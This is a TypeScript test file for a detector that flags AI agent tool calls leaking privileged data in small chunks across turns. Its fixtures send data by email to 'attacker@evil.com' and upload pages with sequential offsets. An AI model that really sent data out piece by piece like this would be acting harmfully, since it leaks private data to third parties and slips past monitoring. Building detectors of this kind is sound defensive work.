/**
 * Tests for Split Exfiltration Detector.
 */

import { describe, it, expect } from 'vitest';
import { detectSplitExfiltration } from '../../src/classifiers/split-exfiltration-detector.js';
import { createSession } from '../../src/engine/session.js';
import type { ToolCallContext } from '../../src/types/context.js';

const OUTBOUND_TOOLS = ['sendEmail', 'postWebhook', 'uploadChunk'];

function makeCtx(overrides: Partial<ToolCallContext> = {}): ToolCallContext {
  return {
    turnId: 'turn-005',
    sessionId: 'session-test',
    toolName: 'sendEmail',
    toolArguments: { recipient: 'attacker@evil.com', body: 'chunk of data' },
    toolResult: 'sent',
    timestamp: Date.now(),
    ...overrides,
  };
}

function makeSessionWithOutboundHistory(
  calls: Array<{ toolName: string; turnId: string; bytes: number; numerics?: number[] }>,
  opts: { privilegedValues?: string[] } = {},
): ReturnType<typeof createSession> {
  const session = createSession();
  for (const val of opts.privilegedValues ?? ['123-45-6789']) {
    session.privilegedValues.add(val);
  }
  for (const call of calls) {
    session.toolCallHistory.push({
      toolName: call.toolName,
      turnId: call.turnId,
      timestamp: Date.now(),
    });
    session.outboundBytesByTurn.set(call.turnId, call.bytes);
    if (call.numerics && call.numerics.length > 0) {
      session.outboundNumericArgsByTurn.set(call.turnId, call.numerics);
    }
  }
  return session;
}

describe('detectSplitExfiltration', () => {
  describe('fires on volume threshold', () => {
    it('should detect when cumulative outbound exceeds threshold with 3+ calls', () => {
      const session = makeSessionWithOutboundHistory([
        { toolName: 'sendEmail', turnId: 'turn-000', bytes: 4000 },
        { toolName: 'sendEmail', turnId: 'turn-001', bytes: 4000 },
      ]);
      // Current call pushes total over 10KB
      const ctx = makeCtx({
        toolArguments: { recipient: 'attacker@evil.com', body: 'x'.repeat(3000) },
      });
      const result = detectSplitExfiltration(ctx, session, OUTBOUND_TOOLS);
      expect(result).not.toBeNull();
      expect(result?.signal).toBe('SPLIT_EXFILTRATION');
      expect(result?.layer).toBe('L3');
      expect(result?.outboundCallCount).toBe(3);
    });

    it('should include cumulative bytes in the signal', () => {
      const session = makeSessionWithOutboundHistory([
        { toolName: 'sendEmail', turnId: 'turn-000', bytes: 5000 },
        { toolName: 'postWebhook', turnId: 'turn-001', bytes: 5000 },
      ]);
      const ctx = makeCtx({
        toolArguments: { recipient: 'attacker@evil.com', body: 'x'.repeat(1000) },
      });
      const result = detectSplitExfiltration(ctx, session, OUTBOUND_TOOLS);
      expect(result).not.toBeNull();
      expect(result!.cumulativeBytes).toBeGreaterThan(10000);
    });

    it('should respect custom threshold from config', () => {
      const session = makeSessionWithOutboundHistory([
        { toolName: 'sendEmail', turnId: 'turn-000', bytes: 200 },
        { toolName: 'sendEmail', turnId: 'turn-001', bytes: 200 },
      ]);
      const ctx = makeCtx({
        toolArguments: { recipient: 'attacker@evil.com', body: 'x'.repeat(200) },
      });
      // Low threshold of 500 bytes
      const result = detectSplitExfiltration(ctx, session, OUTBOUND_TOOLS, 500);
      expect(result).not.toBeNull();
    });
  });

  describe('fires on sequential patterns', () => {
    it('should detect sequential page numbers across outbound calls', () => {
      const session = makeSessionWithOutboundHistory([
        { toolName: 'uploadChunk', turnId: 'turn-000', bytes: 100, numerics: [1] },
      ]);
      const ctx = makeCtx({
        toolName: 'uploadChunk',
        toolArguments: { page: 2, data: 'some data' },
      });
      const result = detectSplitExfiltration(ctx, session, OUTBOUND_TOOLS);
      expect(result).not.toBeNull();
      expect(result?.sequentialPattern).toBe(true);
    });

    it('should detect sequential offsets across outbound calls', () => {
      const session = makeSessionWithOutboundHistory([
        { toolName: 'uploadChunk', turnId: 'turn-000', bytes: 100, numerics: [0] },
        { toolName: 'uploadChunk', turnId: 'turn-001', bytes: 100, numerics: [100] },
      ]);
      const ctx = makeCtx({
        toolName: 'uploadChunk',
        toolArguments: { offset: 200, data: 'chunk3' },
      });
      const result = detectSplitExfiltration(ctx, session, OUTBOUND_TOOLS);
      expect(result).not.toBeNull();
      expect(result?.sequentialPattern).toBe(true);
    });
  });

  describe('does not fire on benign cases', () => {
    it('should return null for non-outbound tools', () => {
      const session = makeSessionWithOutboundHistory([
        { toolName: 'sendEmail', turnId: 'turn-000', bytes: 5000 },
        { toolName: 'sendEmail', turnId: 'turn-001', bytes: 5000 },
      ]);
      const ctx = makeCtx({ toolName: 'internalProcess' });
      const result = detectSplitExfiltration(ctx, session, OUTBOUND_TOOLS);
      expect(result).toBeNull();
    });

    it('should return null when L1 was not active (no privileged data)', () => {
      const session = makeSessionWithOutboundHistory(
        [
          { toolName: 'sendEmail', turnId: 'turn-000', bytes: 5000 },
          { toolName: 'sendEmail', turnId: 'turn-001', bytes: 5000 },
        ],
        { privilegedValues: [] },
      );
      const ctx = makeCtx({
        toolArguments: { recipient: 'user@example.com', body: 'x'.repeat(5000) },
      });
      const result = detectSplitExfiltration(ctx, session, OUTBOUND_TOOLS);
      expect(result).toBeNull();
    });

    it('should return null when volume is below threshold', () => {
      const session = makeSessionWithOutboundHistory([
        { toolName: 'sendEmail', turnId: 'turn-000', bytes: 100 },
        { toolName: 'sendEmail', turnId: 'turn-001', bytes: 100 },
      ]);
      const ctx = makeCtx({
        toolArguments: { recipient: 'user@example.com', body: 'small' },
      });
      const result = detectSplitExfiltration(ctx, session, OUTBOUND_TOOLS);
      expect(result).toBeNull();
    });

    it('should return null with only 1 prior outbound call (below frequency threshold)', () => {
      const session = makeSessionWithOutboundHistory([
        { toolName: 'sendEmail', turnId: 'turn-000', bytes: 8000 },
      ]);
      const ctx = makeCtx({
        toolArguments: { recipient: 'user@example.com', body: 'x'.repeat(5000) },
      });
      // 2 calls total, but minimum is 3 for volume-based detection
      const result = detectSplitExfiltration(ctx, session, OUTBOUND_TOOLS);
      expect(result).toBeNull();
    });

    it('should return null with single outbound call even if volume is large', () => {
      const session = makeSessionWithOutboundHistory([]);
      const ctx = makeCtx({
        toolArguments: { recipient: 'user@example.com', body: 'x'.repeat(20000) },
      });
      const result = detectSplitExfiltration(ctx, session, OUTBOUND_TOOLS);
      expect(result).toBeNull();
    });
  });

  describe('edge cases', () => {
    it('should store outbound bytes in session for future turns', () => {
      const session = makeSessionWithOutboundHistory([]);
      const ctx = makeCtx({
        toolArguments: { recipient: 'user@example.com', body: 'some data' },
      });
      detectSplitExfiltration(ctx, session, OUTBOUND_TOOLS);
      expect(session.outboundBytesByTurn.has(ctx.turnId)).toBe(true);
      expect(session.outboundBytesByTurn.get(ctx.turnId)).toBeGreaterThan(0);
    });
  });
});
